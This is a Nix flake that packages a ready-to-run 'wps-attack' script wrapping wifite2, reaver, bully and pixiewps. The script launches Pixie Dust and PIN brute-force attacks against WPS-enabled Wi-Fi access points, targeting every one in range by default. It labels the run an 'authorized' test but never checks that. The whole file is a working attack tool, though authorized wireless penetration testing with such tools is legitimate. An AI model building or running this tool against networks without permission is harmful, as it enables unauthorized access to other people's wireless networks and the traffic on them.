{
  description = "WPS attack testing with wifite2";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }:
    let
      system = "x86_64-linux";
      pkgs = import nixpkgs { inherit system; };

      wpsAttack = pkgs.writeShellApplication {
        name = "wps-attack";
        runtimeInputs = with pkgs; [
          aircrack-ng
          bully
          coreutils
          iproute2
          iw
          pixiewps
          reaverwps-t6x
          wifite2
        ];

        text = ''
          set -euo pipefail

          usage() {
            printf '%s\n' "Usage: wps-attack <interface> [bssid] [output-dir]" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "  interface  : wireless interface (must support monitor mode)" >&2
            printf '%s\n' "  bssid      : target a specific AP (default: scan and present all WPS APs)" >&2
            printf '%s\n' "  output-dir : directory for results (default: current dir)" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Environment variables:" >&2
            printf '%s\n' "  WPS_MODE=pixie   only run Pixie Dust attacks (fast, no PIN brute-force)" >&2
            printf '%s\n' "  WPS_MODE=pin     only run PIN brute-force attacks" >&2
            printf '%s\n' "  WPS_TIMEOUT=300  seconds to spend per target (default: 300)" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Example: wps-attack wlan1 AA:BB:CC:DD:EE:FF /tmp/wps" >&2
            printf '%s\n' "Example: WPS_MODE=pixie wps-attack wlan1" >&2
            exit 2
          }

          if [ "$#" -lt 1 ] || [ "$#" -gt 3 ]; then
            usage
          fi

          INTERFACE="$1"
          BSSID="''${2:-}"
          OUTPUT_DIR="''${3:-.}"
          WPS_MODE="''${WPS_MODE:-both}"
          WPS_TIMEOUT="''${WPS_TIMEOUT:-300}"

          if [ "$(id -u)" -ne 0 ]; then
            printf '%s\n' "This tool must be run as root." >&2
            exit 1
          fi

          if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
            printf '%s\n' "Interface does not exist: $INTERFACE" >&2
            exit 1
          fi

          if ! iw phy "$(iw dev "$INTERFACE" info | awk '/wiphy/{print "phy" $2}')" info \
               | grep -q '^\s*\* monitor'; then
            printf '%s\n' "Interface $INTERFACE does not support monitor mode." >&2
            exit 1
          fi

          case "$WPS_TIMEOUT" in
            ""|*[!0-9]*)
              printf '%s\n' "WPS_TIMEOUT must be a positive integer." >&2
              exit 2
              ;;
          esac

          mkdir -p "$OUTPUT_DIR"

          set -- -i "$INTERFACE" \
                 --wps-only \
                 --wps-time "$WPS_TIMEOUT" \
                 --kill \
                 --hs-dir "$OUTPUT_DIR"

          case "$WPS_MODE" in
            pixie)
              set -- "$@" --pixie
              ;;
            pin)
              set -- "$@" --no-pixie
              ;;
            both) ;;
            *)
              printf '%s\n' "WPS_MODE must be 'pixie', 'pin', or 'both'." >&2
              exit 2
              ;;
          esac

          if [ -n "$BSSID" ]; then
            set -- "$@" -b "$BSSID"
          fi

          printf '%s\n' "Authorized WPS attack test"
          printf '%s\n' "  Interface  : $INTERFACE"
          printf '%s\n' "  Target     : ''${BSSID:-scan all WPS APs}"
          printf '%s\n' "  Mode       : $WPS_MODE"
          printf '%s\n' "  Timeout    : ''${WPS_TIMEOUT}s per target"
          printf '%s\n' "  Output     : $OUTPUT_DIR"
          printf '%s\n' "Press Ctrl+C to stop."

          # shellcheck disable=SC2086
          wifite "$@"
        '';
      };

    in
    {
      packages.${system} = {
        wps-attack = wpsAttack;
        default = wpsAttack;
      };

      apps.${system}.default = {
        type = "app";
        program = "${wpsAttack}/bin/wps-attack";
      };
    };
}
